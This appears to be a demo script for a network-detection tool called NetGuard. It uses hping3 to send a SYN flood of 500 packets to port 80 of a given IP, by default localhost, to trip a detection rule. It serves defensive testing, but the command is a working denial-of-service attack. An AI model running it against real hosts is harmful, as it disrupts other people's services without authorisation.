#!/bin/bash
# NetGuard Demo — SYN Flood Attack
# Generates a SYN flood exceeding the detection threshold (100 packets / 3s)
# Usage: ./attack_syn.sh [TARGET_IP]
# Requires: hping3

TARGET="${1:-127.0.0.1}"
echo "[*] Launching SYN flood against $TARGET..."
echo "[*] Sending 500 SYN packets rapidly to trigger SYN_FLOOD_001..."
hping3 -S --flood -p 80 -c 500 "$TARGET" 2>/dev/null || \
  hping3 -S -p 80 -c 500 --fast "$TARGET"
echo "[+] SYN flood complete."
